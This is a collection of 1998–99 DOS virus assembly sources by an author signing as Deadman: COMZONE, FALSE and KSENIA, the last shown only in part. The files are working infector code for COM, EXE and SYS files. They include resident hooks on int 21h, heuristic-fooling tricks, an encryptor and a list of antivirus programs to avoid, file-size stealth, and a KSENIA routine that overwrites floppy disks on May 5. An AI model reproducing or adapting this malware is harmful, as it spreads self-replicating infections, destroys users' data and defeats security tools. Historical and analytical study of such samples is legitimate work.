──────────────────────────────────────────────────────────────[COMZONE.ASM]───
 comment %

 Comzone Executer Virus
 Copyright (C) 1999 by Deadman

 COM/TSR non-overwriting infector

 Some comments:

 First, virus will fool a heuristic analysis through mov ax,1200h/int 2fh. So,
 al will be equal 0FFh (MS-DOS installation check, for OS/2 compatibility).
 But under analysis al will not be equal 0ffh, and virus will erase its body
 with 90h (nop instruction) value. And, analyzer will have an encountered
 nop instructions and will pass an infected program.
 Fooled antiviruses: F-Prot 3.03a, DrWeb 4.03, Aidstest.
 AVP/AVPLite 3.0 - Type_ComTSR
 TBScan 7.04 - 4 flags set (F#Mt), probably infected with an unknown virus ;(

 Also virus has a date triggered event, it'll display a string on New Year
 Then virus will check memory infection (mov ax,1898h/int 21h/cmp ax,9818h),
 and if no virus copy installed, it'll copy its body over the infected
 program, after the PSP (CS:0100), and return there. There virus will hook
 int 21h, resize memory block, find infected program's name in environment,
 store stack address, and execute an infected program through 4bh func-
 tion of int 21h, subfunction 00. After the program being executed virus will
 restore SS:SP pair (uses new 80386 instruction, LSS SP,DWORD PTR), and stay
 resident in memory using legal method (function 31h) with 00 errorlevel.
 On int 21h call virus waits 4b00h function and infects the program being
 executed, hooking an int 24h handler, saving file time and date, checking
 file size overflow. Also virus checks first two bytes for MZ/ZM signature.

 Virus length = 512 (200h) bytes
 Negative Checksum = 0FFF8F678h
 Destructive actions - none

                                                Deadman.
 %
 model   tiny
 codeseg
 org     100h
 .386
 start:
       mov      ax,1234h
       push     ax bx cx dx si di bp es ds

       mov      ax,1200h
       push     ds
       xor      si,si
       mov      ds,si
       pushf
       call     dword ptr ds:[2fh*4]
       pop      ds
       xor      al,0ffh
       jz       no_heur

       call     next
 next: pop      di
       add      di,no_heur-next
       mov      al,90h
       mov      cx,1000h
       rep      stosb

 no_heur:
       mov      ah,2ah
       int      21h
       cmp      dx,0c1eh
       jne      install

       call     string
 string:
       pop      dx
       add      dx,outp-string
       mov      ah,9
       int      21h
       jmp      $


 install:
       mov      ax,1898h
       int      21h
       cmp      ax,9818h
       je       here

       mov      di,100h
       call     delta
 delta:
       pop      si
       sub      si,delta-start
       mov      cx,vsize
       rep      movsb
       push     offset continue
       ret
 continue:
       mov      ax,3521h
       int      21h
       mov      io21,bx
       mov      io21+2,es
       mov      ah,25h
       lea      dx,int21
       int      21h

       mov      ah,4ah
       mov      bx,(vsize+100h)/16+2
       push     cs
       pop      es
       int      21h
       mov      seg0,cs
       mov      seg1,cs
       mov      seg2,cs

       mov      si,2ch
       mov      ds,[si]
       xor      ax,ax
       xor      si,si

 get_host:
       cmp      word ptr [si],ax
       je       got_host
       inc      si
       jmp      get_host
 got_host:
       lea      dx,[si+4]

       mov      ax,4b00h
       lea      bx,epb
       mov      cs:_sp,sp
       mov      cs:_ss,ss
       int      21h
       lss      sp,dword ptr cs:_sp

       mov      es,cs:[2ch]
       mov      ah,49h
       int      21h

       mov      ax,3100h
       mov      dx,(vsize+100h)/16+2
       xor      si,si
       mov      ds,si
       mov      si,84h
       pushf
       call     dword ptr [si]

 here:
       pop      ds es
       mov      di,100h
       call     get_orig
 get_orig:
       pop      si
       add      si,prev-get_orig
       movsw
       movsb
       pop      bp di si dx cx bx ax
       db       68h,0,1,0c3h

         db      '[ COMZONE ]',0
 outp    db      'ComZone Executer Copyright (c) 1999 by Deadman',0dh,0ah,24h

 prev    db      0c3h,0,0

 epb     dw      0h      ;
         dw      80h     ;    Адрес коммандной строки
 seg0    dw      ?       ;
         dw      5ch     ;    Адрес первого FCB
 seg1    dw      ?       ;
         dw      6ch     ;    Адрес второго FCB
 seg2    dw      ?       ;

 int21:
         xchg    ax,bx
         cmp     bx,4b00h
         xchg    ax,bx
         je      infect
         cmp     ax,1898h
         jne     exit
         mov     ax,9818h
         iret

 exit:
         db      0eah
 io21    dw      0,0h

 infect: pusha
         push    ds

         mov     bp,ds
         xor     ax,ax
         mov     ds,ax
         mov     si,24h*4
         push    word ptr [si]
         push    word ptr [si+2]
         mov     word ptr [si],offset int24
         mov     word ptr [si+2],cs
         mov     ds,bp

         mov     ax,3d02h
         int     21h
         jc      fail

         xchg    ax,bx
         mov     ax,5700h
         int     21h
         push    cx dx

         mov     ah,3fh
         mov     cx,3
         push    cs
         pop     ds
         lea     dx,prev
         int     21h
         xor     cx,ax
         jnz     close
         mov     ax,word ptr prev
         xor     ax,5050h
         cmp     ax,'MZ' XOR 5050h
         je      close
         cmp     ax,'ZM' XOR 5050h
         je      close

         mov     ax,4202h
         cwd
         int     21h
         or      dx,dx
         jnz     close
         cmp     ax,63000
         ja      close
         cmp     ax,1024
         jb      close
         cmp     byte ptr prev,0e9h
         jne     not_inf
         mov     cx,ax
         sub     cx,vsize
         cmp     word ptr prev+1,cx
         je      close
 not_inf:
         mov     word ptr jump+1,ax
         mov     ah,40h
         mov     cx,vsize
         mov     dx,100h
         int     21h
         jc      close
         xor     cx,ax
         jnz     close
         mov     ax,4200h
         cwd
         int     21h
         mov     ah,40h
         mov     cx,3
         lea     dx,jump
         int     21h
 close:  pop     dx cx
         mov     ax,5701h
         int     21h
         mov     ah,3eh
         int     21h

 fail:   push    0
         pop     ds
         mov     si,24h*4
         pop     word ptr [si+2]
         pop     word ptr [si]

         pop     ds
         popa
         jmp     exit

 int24:  mov     al,3
         iret

 jump    db      0e9h,0,0
 eov:
 vsize   equ     $-start

 _sp     dw      ?
 _ss     dw      ?

         end     start
──────────────────────────────────────────────────────────────[COMZONE.ASM]───
────────────────────────────────────────────────────────────────[FALSE.ASM]───
                        jumps
                        model   tiny
                        codeseg
 start:
                        push    bx cx dx si di bp es ds

                        push    cs
                        pop     es
                        mov     ax,1200h
                        int     2fh
                        cmp     al,0ffh
                        sbb     ch,ch
                        mov     cl,1
                        lea     di,stosed
                        mov     al,90h
                        rep     stosb
 stosed:                nop

                        mov     ax,4408h
                        xor     bx,bx
                        int     21h
                        or      ax,ax
                        jz      exit

                        mov     si,81h
 cmd:
                        lodsb
                        cmp     al,' '
                        jne     ign
                        cmp     byte ptr [si],'*'
                        jne     ign

                        lea     si,scre
 hi:                    lods    byte ptr cs:[si]
                        cmp     al,0
                        jz      eol
                        mov     dl,al
                        mov     ah,2
                        int     21h

                        mov     cx,225
 delay:                 push    cx
                        mov     cx,-1
                        loop    $
                        pop     cx
                        loop    delay
                        jmp     hi
 eol:                   jmp     $



 ign:                   cmp     al,0dh
                        jne     cmd

                        mov     ah,2fh
                        int     21h
                        push    es bx

                        push    cs cs
                        pop     ds es

                        mov     ah,1ah
                        lea     dx,dta
                        int     21h

                        mov     ah,4eh
                        mov     cx,0e7h
                        lea     dx,exe

 fnext:                 int     21h
                        jc      no_more
                        lea     dx,dta+1eh
                        call    infect_exe
                        mov     ah,4fh
                        jmp     fnext

 no_more:               mov     ah,1ah
                        pop     dx ds
                        int     21h
 exit:
                        pop     ds es
                        mov     ax,ds
                        add     ax,10h
                        add     word ptr cs:_cs,ax
                        add     word ptr cs:_ss,ax

                        pop     bp di si dx cx bx

                        db      0b8h
 _ss                    dw      0
                        mov     ss,ax
                        db      0bch
 _sp                    dw      0

                        db      0eah
 _ip                    dw      000h
 _cs                    dw      -10h

 infect_exe             proc    near
                        push    word ptr _ss
                        push    word ptr _sp
                        push    word ptr _ip
                        push    word ptr _cs

                        mov     ax,4301h
                        xor     cx,cx
                        int     21h
                        mov     ax,3d02h
                        int     21h
                        jc      atr

                        xchg    ax,bx
                        mov     ah,3fh
                        mov     cx,28
                        lea     dx,buffer
                        int     21h
                        cmp     ax,cx
                        jnz     close
                        cmp     word ptr buffer,'ZM'
                        jne     close
                        cmp     word ptr buffer+12h,'aF'
                        je      close
                        cmp     byte ptr buffer+18h,40h
                        je      close

                        mov     ax,512
                        mov     cx,word ptr buffer+4
                        cmp     word ptr buffer+2,0
                        jz      $+3
                        dec     cx
                        mul     cx
                        add     ax,word ptr buffer+2
                        adc     dx,0
                        xchg    ax,si
                        xchg    dx,di

                        mov     dx,word ptr dta+1ah+2
                        mov     ax,word ptr dta+1ah
                        cmp     dx,6
                        ja      close

                        cmp     ax,si                   ; compare its
                        jne     close
                        cmp     dx,di
                        jne     close

                        mov     si,word ptr buffer+14h
                        mov     word ptr _ip,si
                        mov     si,word ptr buffer+16h
                        mov     word ptr _cs,si
                        mov     si,word ptr buffer+0eh
                        mov     word ptr _ss,si
                        mov     si,word ptr buffer+10h
                        mov     word ptr _sp,si


                        push    ax dx                   ; get location in exe file
                        mov     cx,16
                        div     cx
                        sub     ax,word ptr buffer+8
                        mov     bp,16
                        sub     bp,dx
                        inc     ax
                        cwd
                        mov     word ptr buffer+14h,dx
                        mov     word ptr buffer+16h,ax
                        inc     ax                      ; special for TBAV
                        mov     word ptr buffer+0eh,ax
                        mov     word ptr buffer+10h,1000h
                        pop     dx ax

                        add     ax,vsize
                        adc     dx,0
                        add     ax,bp
                        adc     dx,0
                        mov     cx,512
                        div     cx
                        or      dx,dx
                        jz      $+3
                        inc     ax
                        mov     word ptr buffer+2,dx
                        mov     word ptr buffer+4,ax

                        mov     word ptr buffer+12h,'aF'

                        mov     ax,5700h
                        int     21h
                        push    cx dx

                        mov     ax,4202h
                        xor     cx,cx
                        cwd
                        int     21h

                        mov     ah,40h
                        mov     cx,bp
                        int     21h
                        mov     ah,40h
                        mov     cx,vsize
                        cwd
                        int     21h
                        xor     cx,ax
                        jnz     res_dda
                        mov     ax,4200h
                        cwd
                        int     21h
                        mov     ah,40h
                        mov     cl,28
                        lea     dx,buffer
                        int     21h
 res_dda:
                        pop     dx cx
                        mov     ax,5701h
                        int     21h

 close:                 mov     ah,3eh
                        int     21h

 atr:                   mov     ax,4301h
                        xor     cx,cx
                        mov     cl,byte ptr dta+15h
                        lea     dx,dta+1eh
                        int     21h

                        pop     word ptr _cs
                        pop     word ptr _ip
                        pop     word ptr _sp
                        pop     word ptr _ss
                        ret

 infect_exe             endp

 exe                    db      '*.exe',0
                        db      '[FALSE]',0
                        db      'Copyright (C)  1998-99 by Deadman',0

 scre                   db      'It seems to be all right',0dh,0ah,0

 vsize                  equ     $-start

 dta                    db      43 dup (?)
 buffer                 label   byte
                        end     start
────────────────────────────────────────────────────────────────[FALSE.ASM]───
───────────────────────────────────────────────────────────────[KSENIA.ASM]───
 comment ^

              KSENIA Virus Copyright (C) 1998-99 Deadman
            └────────────────────────────────────────────┘
        Pre-release Version (0.99 alpha). E-Mail: dman@mail.ru

 TSR/COM/EXE/SYS non-overwriting infector
  Infects on 3Dh/43h/4Bh/56h/6Ch (Open/ChMOD/Exec/Rean/ExtOpen)
  Size stealth on 11h/12h/4Eh/4Fh (Find First/Next FCB/DTA)
  Redirection stealth on 3Fh/42h (Read/LSeek)
  Disinfects the host on 40h (Write)
  Date stealth on 5700h/5701h (Get/Set File time/date)
  Uses Low memory addresses
  Encrypted. Uses XOR/ADD/SUB/NOT/INC/DEC/ROR/ROL/NEG encryptors
  Creates random 16-bit decryption key (value)
  Encrypts the decryption routine via simple XOR
  Doesn't infect files with a current hour stamp
  Doesn't infect files beginning on
      FI (FindVirus)
      SC (McAfee Scan)
      VS (McAfee VShield/Microsoft VSafe)
      TB (ThunderByte shit)
      DR (Doctor Web)
      AV (AntiViral Toolkit Pro)
      F- (F-Protect)
      FP (F-Protect)
      CO (Command Interpreter)
  Disable stealth on running programs (through MCB Owner)
      PKZIP   ──┐
      RAR       │
      ARJ       ├ Archivers
      LHA       │
      ARC     ──┘
      DEFRAG  ──┐
      SPEEDISK  │
      CHKDSK    │
      BACKUP    ├ To avoid errors
      MSBACKUP  │
      SCANDISK  │
      NDD     ──┘
  Anti-AV routines (Heuristic/Encryption)
      DrWeb 3.24/4.00      - No detection
      AVP/AVPLite 3.0      - No detection
      F-Prot 3.03a         - No detection
      NAV 4.0 (Bloodhound) - No detection
      MSAV                 - No detection
      TbScan 7.04          - No detection, "T" flag set
       TbClean             - Can't emulate ;( ...
  Gets the original int 21h vector uses tunneling method
  Uses SPLICE technology, simple anti-bug trick on windows run
  On May, the 5-th virus will erase every diskette you will insert
  Novell Network shit, depends on system time

 ^

 vsize  equ     eov-ksenia      ; virus size
 msize  equ     eom-ksenia      ; memory needed for virus


        model   tiny
        codeseg
        .386                    ; e?x and dwords enabled :)
 ksenia:
        push    ax bx cx dx si di bp es ds

        cld                     ; take down VSafe
        xor     ax,ax           ; ax  FA01
        mov     ds,ax           ; dx  5945
        mov     ax,0fa01h       ; int 16
        mov     dx,05945h
        pushf                   ; avoid TBScan stealth flag (X)
        call    dword ptr ds:[58h]

        call    extra           ; calculate extra offset
        xor     dx,dx           ; dx=0
        mov     ax,1200h
        pushf
        call    dword ptr ds:[0bch]
        sub     al,0ffh         ; no analysise => al=ff
        sbb     dh,0            ; if yes => dh<>0

        cli                     ; disable interrupts
        mov     si,09h*4        ; si=int 09h vector
        mov     ax,0ffffh
        push    word ptr [si]   ; save offset on stack
        mov     [si],ax         ; break it
        sub     [si],ax         ; breaked?
        pop     word ptr [si]   ; restore offset
        sti
        sbb     dh,0            ; if not => dh<>0

        lea     di,kill_vir+bp  ; store dx+1 nop after kill_vir label
        push    cs              ;
        pop     es
        mov     cx,1
        add     cx,dx
        mov     al,90h
        rep     stosb

 kill_vir:
        nop
        call    crypt           ; decrypt virus in memory
 enc_start:
        cmp     word ptr cs:[original+bp],0ffffh ; started from SYS?
        jne     no_sys

        lea     si,original+bp+6 ; reset interrupt and
        mov     di,6             ; strategy offset
        push    cs cs
        pop     ds es
        movsw
        movsw

        mov     ax,0ba00h       ; move virus body into video memory
        mov     es,ax           ; at BA00:0000
        xor     di,di
        mov     si,bp
        mov     cx,msize
        rep     movsb

        pop     ds es bp di si dx cx bx ax ; restore registers
        push    0ba00h offset sys_return   ; return address
        jmp     word ptr cs:[8]            ; call original routine

 sys_return:
        push    ax bx cx dx si di bp es ds ; staying resident after the driver
                                           ; is installed
        xor     bp,bp                      ; extra offset = 0

        mov     ax,18ddh                   ; already installed?
        int     21h
        cmp     ax,303h                    ; if yes, so return to dos
        je      complete

        les     bx,dword ptr cs:req_head   ; request header
        mov     ax,word ptr es:[bx+0eh]    ; last byte after the driver
        cmp     ax,55000                   ; installation. Is there enough
        ja      complete                   ; memory to append?
        add     word ptr es:[bx+0eh],msize ; increase last byte value
        shr     ax,4                       ; getting new CS
        inc     ax
        add     ax,word ptr es:[bx+10h]
        mov     es,ax
        jmp     move_it

; ---- COM/EXE installation ---
 no_sys:
        mov     ax,18ddh
        int     21h
        cmp     ax,303h
        je      complete

        mov     ah,62h          ; psp address
        int     21h
        mov     cs:psp+bp,bx
        add     bx,10h          ; moving virus body over the infected program
        mov     es,bx

 move_it:
        xor     di,di
        mov     si,bp
        mov     cx,msize
        push    cs
        pop     ds
        pushf
        push    es offset zero_bp
        cli
        mov     bp,sp
        sub     bp,7
        mov     word ptr [bp],0a4f3h    ; rep movsb instruction
        mov     byte ptr [bp+2],0cfh    ; iret opcode
        push    ss bp
        retf

 zero_bp:
        sti
        push    cs
        pop     ds
        mov     resthost,0
        mov     ax,psp
        mov     seg0,ax
        mov     seg1,ax
        mov     seg2,ax
        mov     point,offset keyword

        call    cr21z                        ; int 21h vector search
        call    restorehost

        xor     ax,ax           ; ds=0
        mov     ds,ax           ; setting new int 09h vector
        mov     si,09h*4        ;
        lea     di,io9
        movsw
        movsw
        mov     word ptr [si-4],offset int9
        mov     word ptr [si-2],es

        cmp     word ptr cs:original,0ffffh
        je      complete

        mov     es,cs:psp
        mov     ah,4ah
        mov     bx,(msize+100h)/16+2
        int     21h

        mov     si,2ch         ; environment segment
        mov     ds,es:[si]
        xor     ax,ax
        xor     si,si

 get_host:
        cmp     word ptr [si],ax ; looking for the 0000h word
        je      got_host
        inc     si
        jmp     get_host
 got_host:
        lea     dx,[si+4]       ; dx -> infected program's name

        mov     ax,4b00h        ; executing program
        lea     bx,epb
        push    cs
        pop     es
        cli
        xor     si,si
        mov     ss,si
        mov     sp,600h+256
        int     21h
        cli
        xor     ax,ax
        mov     ss,ax
        mov     sp,600h+256
        sti

        mov     ax,cs:psp
        dec     ax
        mov     ds,ax
        xor     si,si
        mov     al,4dh
        xchg    al,byte ptr [si]
        mov     byte ptr [si+100h],al
        mov     word ptr [si+3],0fh
        mov     word ptr [si+103h],msize/16+2
        mov     word ptr [si+101h],8

        mov     ah,4dh          ; exit code in AL
        int     21h
        mov     ah,4ch          ; DOS program terminate
        int     21h


══════════════════════════════════════════════════════════════════════════════
 complete:
        pop     ds es           ; восстановить сегментные
        mov     ax,es           ; регистры и сохранить их значение в ax

        lea     si,original+bp            ; si-сохраненное начало хоста
        mov     cx,word ptr cs:[si]
        cmp     cx,'MZ'                   ; откуда стартовали?
        je      run_exe                   ; 'MZ' 'ZM' -> из ЕХЕшника
        cmp     cx,'ZM'                   ; 0ffffh -> из SYSа
        je      run_exe                   ; иначе из СОМа
        inc     cx
        jz      run_sys

        mov     di,0100h        ; стартовали из СОМа,
        movsw                   ; восстановить начало
        movsb

        pop     bp di si dx cx bx ax
        db      0ebh,1          ; джамп на 6890h
        mov     sp,6890h        ; а это-nop/push 0100
        db      0,1
        db      0ebh,1          ; джамп на C3h
        mov     al,0c3h         ; тобишЬ ret

 run_exe:
        add     ax,010h         ; восстанавливаем ЕХЕшник
        mov     dx,cs:[si+14h]  ; старое IP
        mov     cs:_ip+bp,dx
        mov     dx,cs:[si+16h]  ; старое CS
        add     dx,ax           ; + PSPSeg+10h
        mov     cs:_cs+bp,dx

        mov     dx,cs:[si+10h]  ; старое SP
        mov     cs:_sp+bp,dx
        add     ax,cs:[si+0eh]  ; старое SS
        mov     cs:_ss+bp,ax

        pop     bp di si dx cx bx ax

        cli
        db      0bch            ;
 _ss    dw      ?               ; cli
        mov     ss,sp           ; mov sp,ss_value
        db      0bch            ; mov ss,sp
 _sp    dw      ?               ; mov sp,sp_value
        sti                     ; sti

        db      0eah            ; far jump instruction
 _ip    dw      ?
 _cs    dw      ?

 run_sys:
        pop     bp di si dx cx bx ax
        retf

 pushall      macro
              pushf
              push    ax bx cx dx si di bp ds es
              endm

 popall       macro
              pop     es ds bp di si dx cx bx ax
              popf
              endm

 copyright    db      '[KSENIA]',0
              db      'Version 0.99 alpha',0
              db      'Copyright (C) ',??date,20h,??time,' by Deadman',0
              db      'The Global Project devoted to Ksenia Chizhova',0

 nmess        db      'External System Error #05. Connection refused.',0
 endnmess:

 wino32bit    db      ' /d:c',0dh

 stdisable    db      'PKZIP',0
              db      'RAR',0
              db      'ARJ',0
              db      'LHA',0
              db      'ARC',0
              db      'DEFRAG',0
              db      'SPEEDISK',0
              db      'CHKDSK',0
              db      'BACKUP',0
              db      'MSBACKUP',0
              db      'SCANDISK',0
              db      'NDD',0
              db      0ffh

 funcs        db      18h XOR 25h
              dw      tsrtest
              db      0eh XOR 25h
              dw      select
              db      3dh XOR 25h
              dw      infect
              db      43h XOR 25h
              dw      infect
              db      4bh XOR 25h
              dw      infect
              db      56h XOR 25h
              dw      infect
              db      6ch XOR 25h
              dw      extinfect

              db      11h XOR 25h
              dw      fcbstealth
              db      12h XOR 25h
              dw      fcbstealth
              db      4Eh XOR 25h
              dw      dtastealth
              db      4Fh XOR 25h
              dw      dtastealth
              db      00h XOR 25h
              dw      terminate
              db      31h XOR 25h
              dw      terminate
              db      4Ch XOR 25h
              dw      terminate
              db      32h XOR 25h
              dw      getdpb

              db      42h XOR 25h
              dw      seekstealth
              db      3fh XOR 25h
              dw      readstealth
              db      40h XOR 25h
              dw      writehandler
              db      57h XOR 25h
              dw      datestealth
 endf:

 original     db      0c3h,27 dup (0)

 epb     dw      0h      ;
         dw      80h     ;    Адрес коммандной строки
 seg0    dw      ?       ;
         dw      5ch     ;    Адрес первого FCB
 seg1    dw      ?       ;
         dw      6ch     ;    Адрес второго FCB
 seg2    dw      ?       ;

 keyword db      25h+80h,1Fh+80h,12h+80h,31h+80h,17h+80h,1Eh+80h
 copy           db '123 4 5 Deadman'
 endcopy:

 smb_pattern    db      10100111b
                db      10100100b
                db      11000111b
                db      10100001b
                db      10100111b
                db      00000000b
                db      00000000b
                db      01111110b
                db      10000001b
                db      01111110b
                db      00000000b
                db      00000000b
                db      00000000b
                db      00000000b

                db      11101001b
                db      10001001b
                db      11101101b
                db      10001011b
                db      11101001b
                db      00000000b
                db      00000000b
                db      01111110b
                db      10000001b
                db      01111110b
                db      00000000b
                db      00000000b
                db      00000000b
                db      00000000b

                db      11100110b
                db      01001001b
                db      01001111b
                db      01001001b
                db      11101001b
                db      00000000b
                db      00000000b
                db      01111110b
                db      10000001b
                db      01111110b
                db      00000000b
                db      00000000b
                db      00000000b
                db      00000000b

                db      00000000b
                db      00000000b
                db      00000000b
                db      00111100b
                db      01000010b
                db      10011001b
                db      10100001b
                db      10100001b
                db      10011001b
                db      01000010b
                db      00111100b
                db      00000000b
                db      00000000b
                db      00000000b

                db      00000000b
                db      00000000b
                db      11101001b
                db      10101001b
                db      10101001b
                db      10101001b
                db      11101001b
                db      11001111b
                db      10100001b
                db      10100001b
                db      10100001b
                db      11101110b
                db      00000000b
                db      00000000b


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 21
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 tsr:   pushf
        cmp     cs:resthost,0
        je      usual_work
        popf
        mov     cs:resthost,0
        push    bp ax si ds
        mov     bp,sp
        sub     word ptr [bp+8],2
        lds     si,dword ptr [bp+8]
        mov     ax,cs:keepword
        mov     [si],ax
        call    restorehost
        pop     ds si ax bp
        iret

 usual_work:
        push    ds si ax                ; сохранить регистры
        lds     si,dword ptr cs:io21    ; загрузить адрес
        mov     ax,word ptr cs:prev2    ; обработчика int 21h
        mov     word ptr [si],ax        ; и починить его
        pop     ax
        push    ax

        xchg    al,ah
        xor     al,25h
        xor     si,si           ; ищем в таблице номер
 findfunc:
        cmp     al,cs:funcs+si  ; функции, которая сейчас
        jne     wrongfunc       ; вызывается
        call    verifymcb       ; нашли - проверить mcb

        mov     ax,word ptr cs:funcs+si+1 ; взять смещение
 quit_manager:
        mov     word ptr cs:func_jump,ax
        pop     ax si ds                  ; обработчика для этой функции
        popf                              ; восстановить всякую лажу
        mov     cs:func_number,ax
        push    cs:func_jump              ; сослаться на обработчик
        ret

 wrongfunc:
        add     si,3            ; берем следующую функцию
        cmp     si,endf-funcs   ; из таблицы
        jb      findfunc        ; иссякла?
        lea     ax,exithandler
        jmp     quit_manager

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Infect a file
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 extinfect:
        pushad
        mov     dx,si
        jmp     realinfect

 infect:
        pushad

 realinfect:
        push    ds es           ; сохранить регистры

        cmp     ax,4b00h
        jne     no_novell_check
        call    novell          ; фак ап юзер

 no_novell_check:
        push    ds              ; сохранить eax,ds
        push    0               ; засунуть в ds туда 0
        pop     ds
        mov     si,24h*4
        mov     eax,[si]                    ; сохранить 24-й вектор
        mov     dword ptr cs:io24,eax       ; установить свой
        mov     word ptr [si],offset int24h ; очень робкий и
        mov     word ptr [si+2],cs          ; стеснительный
        pop     ds

        mov     cx,128          ; анализируем имя файла
        mov     di,dx           ; ищем у него конец
 get_end:
        mov     al,[di]
        inc     di
        or      al,al
        loopnz  get_end
        jz      got_end         ; импотент?

 huy:   jmp     noinf

 got_end:
        dec     di
        mov     al,[di]         ; взять байт из строки
        cmp     al,'.'          ; начало расширения?
        je      got_pixel
        cmp     al,'\'          ; начало каталога?
        je      huy
        cmp     al,':'          ; ID диска?
        je      huy
        cmp     di,dx           ; начало строки?
        ja      got_end
        jmp     huy

 got_pixel:
        mov     ax,[di+2]       ; взять два символа
        call    upreg           ; расширения и ПОДНЯТЬ их
        shl     eax,16
        mov     ax,[di]
        call    upreg
        cmp     eax,'SYS.'
        je      good_ext
        cmp     eax,'MOC.'
        je      good_ext
        cmp     eax,'EXE.'
        jne     huy

 good_ext:
        xchg    bp,ax
        call    filenamecheck   ; проверить файл
        jc      huy

        mov     ax,4300h        ; достать аттрибуты файла
        call    int21
        jc      huy

        mov     si,cx           ; сохранить их в si
        mov     ax,4301h        ; установить нормальные ones
        xor     cx,cx
        call    int21
        jc      huy

        push    si ds dx        ; сохранить указатель и атр

        mov     ax,3d02h        ; пытаться открыть файл
        call    int21           ; для чтения/записи
        jc      restoreattr

        xchg    ax,bx           ; положить hanlde в bx
        push    cs cs           ; ds и es показывают на нас
        pop     ds es
        call    handlecheck     ; проверить файл на предмет
        jc      forcedclose     ; недисковости

        call    seek2eof        ; слишком большой?
        cmp     dx,10           ; а то Divide Overflow
        jae     close           ; начнет выебываться
        call    seek2bof        ; оттянуть конец обратно

        call    inf?            ; проверить, был ли он инфи-
        jc      close           ; цирован вирусом

        mov     ah,3fh          ; считать первые 28 байт
        mov     cx,28           ; в ds:original
        lea     dx,original
        call    int21
        cmp     cx,ax           ; все прочиталось?
        jne     close
        lea     si,original     ; сделать в буфере копию
        lea     di,buffer
        mov     cx,28
        cld
        rep     movsb

        lea     si,original     ; no comments
        lea     di,buffer

        mov     ax,[si]         ; взять в ax первые 2 байта
        cmp     bp,'S.'
        je      infect_sys
        cmp     ax,'ZM'         ; так ли это?
        je      infect_exe
        cmp     ax,'MZ'
        je      infect_exe

        call    cominfect
        jmp     analyse
 infect_exe:
        call    exeinfect
        jmp     analyse
 infect_sys:
        call    sysinfect
 analyse:
        jc      close           ; хоста
        call    writevirus      ; записать вирус

 close: call    correctdate
 forcedclose:
        mov     ah,3eh          ; закрыть его - чтоб он здох
        call    int21

 restoreattr:
        pop     dx ds cx        ; восстановить аттрибуты
        mov     ax,4301h
        call    int21

 noinf: push    0               ; восстановить 24-й вектор
        pop     ds
        push    eax
        mov     eax,dword ptr cs:io24           ; вернуть старый вектор
        mov     dword ptr ds:[24h*4],eax        ; прерывания 24 на место
        pop     eax

        pop     es ds           ; восстановить регистры
        popad

        jmp     exithandler     ; уйти..

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Select disk
; Disk erasing on holidays
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 select:
        pusha
        cmp     dl,2            ; гибкого диска, если он устанавливается
        jae     not_floppy      ; текущим или затираем дискету

        mov     bp,dx
        mov     ah,2ah          ; опрос даты
        call    int21
        cmp     dx,0505h        ; 05.05.XXXX?
        mov     dx,bp
        jne     not_floppy

        inc     dl              ; узнаем, сколько секторов на диске
        mov     ah,36h
        call    int21
        inc     ax
        jz      not_floppy
        dec     ax

        mul     dx
        mov     cx,ax
        mov     dx,1            ; со второго сектора (чтоб всяко мониторо
        dec     cx              ; ни гугу)
        mov     ax,bp
        int     26h
        popf

 not_floppy:
        popa
        jmp     exithandler

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; fcb size/date stealth ── called by 11h/12h
; no extension check (see above)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 fcbstealth:
        call    int21                   ; find file!
        pushall                         ; save all 16-bit registers (exc. SP)
        cmp     al,0FFh                 ; no more filez?
        jz      no_stealth              ; nothing to do!
        cmp     cs:stf,0                ; can we stealth?
        jnz     no_stealth              ; we can't stealth
        cmp     cs:drf,0                ; can we stealth?
        jnz     no_stealth              ; we can't stealth

        mov     ah,2Fh                  ; get current DTA address
        call    int21
        mov     al,0FFh                 ; al = FF
        cmp     es:[bx],al              ; FCB is extended?
        jne     no_ext                  ; not extended!
        add     bx,7                    ; else 7 extra bytes
 no_ext:
        lea     si,[bx+14h]             ; si points to file date
        lea     di,[bx+1Dh]             ; di points to file size
        call    sizst                   ; stealth real file size!
        jmp     no_stealth              ; show the false to user!

